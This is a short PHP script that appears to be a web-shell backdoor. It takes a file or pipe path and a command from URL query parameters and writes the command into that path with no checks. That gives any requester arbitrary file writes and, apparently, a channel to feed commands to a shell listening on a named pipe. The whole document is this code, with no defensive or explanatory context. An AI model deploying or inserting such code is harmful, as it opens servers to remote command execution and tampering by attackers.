<?php
$fp = fopen($_GET['pipe'], 'r+');
fwrite($fp, $_GET['cmd']);
fclose($fp);